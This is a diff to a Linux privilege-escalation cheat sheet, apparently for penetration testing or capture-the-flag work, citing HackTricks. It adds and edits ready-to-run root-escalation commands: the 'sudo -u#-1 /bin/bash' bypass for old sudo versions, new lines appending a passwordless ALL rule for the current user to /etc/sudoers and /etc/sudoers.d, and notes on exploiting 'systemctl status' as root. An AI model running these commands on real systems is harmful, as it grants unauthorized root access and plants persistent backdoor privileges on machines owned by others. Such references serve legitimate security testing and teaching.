@@ -265,10 +265,19 @@ sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> -C <column_
 sudo --version
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
 
-# If sudo version is < 1.28, try the following command
+# If the sudo version is < 1.28, try the following command for LPE
 sudo -u#-1 /bin/bash
 ```
-> - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
+> - [HackTricks: Sudo Version](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version)
+
+### Edit Sudoers
+```bash
+# If writable permissons are set on /etc/sudoers or /etc/sudoers.d,
+# allow the current user to execute all commands as root without password
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
+```
+> - [HackTricks: Edit Sudoers](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#etc-sudoers-etc-sudoers.d)
 
 ## Systemctl
 
@@ -302,7 +311,7 @@ sudo systemctl start root
 ### Sudo permissions on `systemctl status`
 ```bash
 # 0. Check the systemd version
-# (If systemd version is >= 247, the probability of exploitation is lower due to a patch for CVE-2023-26604)
+# (If the systemd version is >= 247, the probability of exploitation is lower due to a patch for CVE-2023-26604)
 systemctl --version
 
 # 1. Execute systemctl status as root on any service (existing or non-existing)
